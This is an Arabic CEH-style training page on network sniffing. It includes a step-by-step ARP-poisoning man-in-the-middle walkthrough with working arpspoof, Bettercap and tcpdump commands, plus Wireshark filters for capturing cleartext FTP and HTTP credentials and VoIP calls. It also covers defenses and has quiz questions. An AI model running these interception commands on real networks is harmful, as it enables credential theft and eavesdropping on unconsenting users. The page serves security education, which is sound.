الاستماع السلبي والنشط لحركة الشبكة — من بروتوكولات TCP/IP إلى اعتراض البيانات الحساسة

🛠️ Wireshark · tcpdump · Bettercap · Scapy 📋 CEH Domain: Sniffing (Weight ~10%) CVSS Impact: High → Critical

📚 النظرية — كيف يعمل الـ Sniffing على مستوى البروتوكولات

🔌 Passive Sniffing (على شبكات Hub)

في شبكات الـ Hub القديمة، يتم إرسال كل حزمة (Frame) إلى جميع الأجهزة المتصلة في نفس الـ Collision Domain. يستطيع المهاجم فتح بطاقة الشبكة (NIC) في Promiscuous Mode لاستقبال وقراءة جميع الحزم — ليس فقط تلك الموجهة إليه.

Promiscuous Mode:

وضع خاص في بطاقة الشبكة يجعلها تقبل جميع الحزم التي تمر على الكابل بغض النظر عن عنوان الـ MAC المستهدف. يتم تفعيله تلقائياً بمجرد تشغيل Wireshark أو tcpdump.

⚡ Active Sniffing (على شبكات Switch)

الـ Switch الحديث يحتفظ بجدول يسمى CAM Table (Content Addressable Memory) يربط كل عنوان MAC بالـ Port الذي يتصل به. يرسل الحزمة فقط للـ Port الصحيح — لذا لا يمكن الـ Passive Sniffing هنا. المهاجم يحتاج تقنيات نشطة:

  • MAC Flooding — إغراق الـ CAM Table بعناوين وهمية
  • ARP Spoofing/Poisoning — التلاعب بجدول ARP
  • DNS Poisoning — تزوير استجابات DNS
  • DHCP Starvation — استنزاف عناوين IP الديناميكية

🔬 بروتوكول ARP — الآلية الجوهرية للـ Active Sniffing

الـ ARP (Address Resolution Protocol) هو بروتوكول L2 يُستخدم لترجمة عناوين IP إلى عناوين MAC على الشبكة المحلية. كل جهاز يحتفظ بـ ARP Cache (جدول مؤقت). المشكلة الأساسية:

⚠️ ARP is Stateless & Trustless:

الـ ARP لا يتحقق من صحة الردود. إذا أرسل جهازٌ ما حزمة ARP Reply بدون طلب مسبق (Gratuitous ARP)، سيقوم الجهاز المستقبِل بتحديث جدول الـ ARP Cache فوراً. هذا هو الثغرة الجوهرية التي يستغلها هجوم ARP Poisoning.

# ARP Request (Broadcast)
Who has 192.168.1.1?
Tell 192.168.1.100
Dst MAC: FF:FF:FF:FF:FF:FF (Broadcast)
Src MAC: AA:BB:CC:DD:EE:FF
# ARP Reply (Unicast)
192.168.1.1 is at 00:11:22:33:44:55
Dst MAC: AA:BB:CC:DD:EE:FF
Src MAC: 00:11:22:33:44:55

🔬 تشريح الهجوم — Man-in-the-Middle عبر ARP Poisoning

هجوم MITM (Man-in-the-Middle) كلاسيكي على شبكة LAN — مقسّم لمراحل واضحة:

1️⃣
Network Reconnaissance

اكتشاف الشبكة وتحديد الأهداف — عنوان IP الـ Gateway، عناوين الضحايا، خريطة الشبكة المحلية.

# Discover active hosts on the network sudo nmap -sn 192.168.1.0/24 # Identify the default gateway ip route | grep default # View current ARP cache arp -a
2️⃣
Enable IP Forwarding

تفعيل توجيه الحزم (IP Forwarding) حتى تستمر الضحية في الوصول للإنترنت — هذا يجعل الهجوم غير مكتشَف.

# Linux: Enable IP forwarding echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Or permanently via: sudo sysctl -w net.ipv4.ip_forward=1
3️⃣
ARP Poisoning with arpspoof / Bettercap

إرسال حزم ARP Reply مزيفة للضحية والـ Gateway لتحويل حركة البيانات عبر جهاز المهاجم.

# Using arpspoof (dsniff package): # Tell VICTIM that Gateway's MAC is ours sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 # Tell GATEWAY that Victim's MAC is ours (in another terminal) sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 # OR using Bettercap (more modern): sudo bettercap -iface eth0 # In bettercap interactive mode: net.probe on arp.spoof.targets 192.168.1.100 arp.spoof on
4️⃣
Traffic Capture & Analysis

بعد نجاح الـ ARP Poisoning، كل حزمة تمر عبر المهاجم — يمكن التقاطها وتحليلها بـ Wireshark أو tcpdump.

# Capture all traffic through the attacker: sudo tcpdump -i eth0 -w capture.pcap # Filter for interesting protocols: sudo tcpdump -i eth0 port 21 or port 23 or port 80 or port 110 # In Wireshark — display filters: # HTTP auth: http.authorization # FTP credentials: ftp.request.command == "PASS" # Telnet data: telnet

tcpdump Capture Filters (BPF Syntax)

# Capture all traffic on interface sudo tcpdump -i eth0 # Capture traffic to/from specific host sudo tcpdump -i eth0 host 192.168.1.100 # Capture traffic on specific port sudo tcpdump -i eth0 port 80 # Capture HTTP POST requests sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' # Capture FTP, Telnet, HTTP together sudo tcpdump -i eth0 'port 21 or port 23 or port 80' # Write to file and read later in Wireshark sudo tcpdump -i eth0 -w /tmp/capture.pcap -G 60 -W 1 # Read the file tcpdump -r /tmp/capture.pcap # Capture non-encrypted traffic and print ASCII sudo tcpdump -i eth0 -A -s 0 'port not 443 and port not 22' # Show only ARP packets sudo tcpdump -i eth0 arp # Verbose mode with hex dump sudo tcpdump -i eth0 -XX -vv

🏆 دراسات حالة حقيقية

☕ Case 1: Coffee Shop WiFi Interception — $0 بيانات حساسة

السيناريو: باحث أمني في مقهى عام يستخدم WiFi مفتوح. قام بتشغيل Wireshark على نفس الشبكة واكتشف:

  • حركة HTTP غير مشفرة تحمل credentials لمواقع قديمة
  • جلسات FTP بكلمات مرور واضحة لرفع ملفات المشاريع
  • نماذج تسجيل دخول لمنتديات قديمة بدون HTTPS
الدرس المستفاد:

أي بروتوكول غير مشفر (HTTP, FTP, Telnet, SMTP plain) على شبكة مشتركة = خطر فعلي. HTTPS ليس رفاهية بل ضرورة.

🏭 Case 2: Corporate LAN MITM — اعتراض VoIP Calls

السيناريو: خلال pentest داخلي، نجح الفريق في تنفيذ ARP Poisoning وفصل حركة VoIP (SIP/RTP غير مشفر).

  • استخراج حزم RTP وتحويلها لملف صوتي بـ Wireshark (Telephony → VoIP Calls)
  • سماع محادثات داخلية تحتوي على معلومات حساسة
  • التأثير: معلومات العملاء، صفقات تجارية، قرارات الإدارة
في Wireshark: Telephony → VoIP Calls → Select call → Play Streams

🛡️ الحماية والدفاع — Defense in Depth

✅ حماية على مستوى الشبكة

  • Dynamic ARP Inspection (DAI): يتحقق من صحة حزم ARP مقابل DHCP Snooping table
  • DHCP Snooping: يمنع DHCP Rogue Servers من الرد على الطلبات
  • Port Security: تحديد أقصى عدد MAC لكل port على الـ Switch
  • 802.1X (Port-based NAC): مصادقة الأجهزة قبل السماح لها بالشبكة
  • Private VLANs: عزل الأجهزة عن بعضها حتى في نفس الـ VLAN
  • Network Segmentation: تقسيم الشبكة وتقليص الـ Broadcast Domains

🔒 حماية على مستوى البروتوكول

  • HTTPS Everywhere (HSTS): إجبار كل الاتصالات على TLS
  • HSTS Preloading: إدراج النطاق في قائمة المتصفحات المسبقة
  • VPN للمستخدمين: تشفير كل حركة البيانات من النهاية للنهاية
  • SSH بدل Telnet: استبدال البروتوكولات غير المشفرة
  • SFTP/FTPS بدل FTP: نقل الملفات بشكل آمن
  • SMTPS/IMAPS: تشفير البريد الإلكتروني

🧪 تحدي CTF — اختبر معلوماتك

❓ السؤال 1: ما الفرق بين Passive و Active Sniffing؟
✅ الإجابة:

Passive Sniffing: يعمل على شبكات Hub — فقط يستمع دون إرسال أي حزم إضافية. لا يمكن اكتشافه لأنه لا يترك أثراً.
Active Sniffing: يعمل على شبكات Switch — يرسل حزم إضافية (ARP Replies مزيفة، MAC Flood frames) لخداع الشبكة. يمكن اكتشافه بأدوات مثل ARPwatch.

❓ السؤال 2: ما هو Promiscuous Mode ولماذا يستخدمه المهاجم؟
✅ الإجابة:

Promiscuous Mode هو وضع في بطاقة الشبكة (NIC) يجعلها تقبل وتعالج جميع الحزم التي تصل للـ Interface — حتى تلك التي ليست موجهة لعنوان MAC الخاص بالجهاز. في الوضع العادي، تتجاهل بطاقة الشبكة أي حزمة لا تحمل MAC Address الخاص بها. يستخدمه المهاجم لالتقاط حركة البيانات على شبكة Hub أو بعد تنفيذ ARP Poisoning.

❓ السؤال 3: ما هو Wireshark filter لالتقاط فقط محاولات تسجيل الدخول عبر FTP؟
✅ الإجابة:
ftp.request.command == "PASS" # أو لرؤية كل أوامر FTP: ftp.request.command

📖 Cheat Sheet — المرجع السريع

Wireshark Filters
  • arp — كل حزم ARP
  • http.authorization — HTTP credentials
  • ftp.request.command=="PASS"
  • dns — كل استعلامات DNS
  • tcp.flags.syn==1 && tcp.flags.ack==0
  • icmp.type==8 — Echo Requests
tcpdump Commands
  • -i eth0 — Interface
  • -w out.pcap — Write to file
  • -r file.pcap — Read file
  • -A — Print ASCII
  • -nn — No name resolution
  • port 80 — Filter by port
  • host 1.2.3.4 — Filter by host
Defense Checklist
  • ☑ DHCP Snooping enabled
  • ☑ Dynamic ARP Inspection
  • ☑ Port Security on Switch
  • ☑ HTTPS / HSTS enforced
  • ☑ VPN for remote users
  • ☑ ARPwatch monitoring
  • ☑ 802.1X authentication
  • ☑ Network segmentation
